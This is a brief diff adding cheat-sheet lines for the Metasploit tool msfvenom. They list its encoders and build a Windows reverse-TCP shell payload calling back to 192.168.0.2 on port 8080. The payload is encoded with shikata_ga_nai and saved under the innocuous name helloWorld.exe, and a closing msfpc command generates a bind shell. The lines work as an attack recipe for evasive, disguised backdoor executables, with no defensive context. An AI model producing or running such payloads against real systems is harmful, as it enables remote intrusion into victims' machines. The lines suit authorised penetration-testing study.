@@ -1,0 +1,7 @@
+msfvenom -l encoders
+
+msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=192.168.0.2 LPORT=8080 -b "\x00" -e x86/shikata_ga_nai -f exe > helloWorld.exe
+
+msfpc – Msfvenom Payload Creator (MPC)
+
+msfpc windows bind 8080 verbose
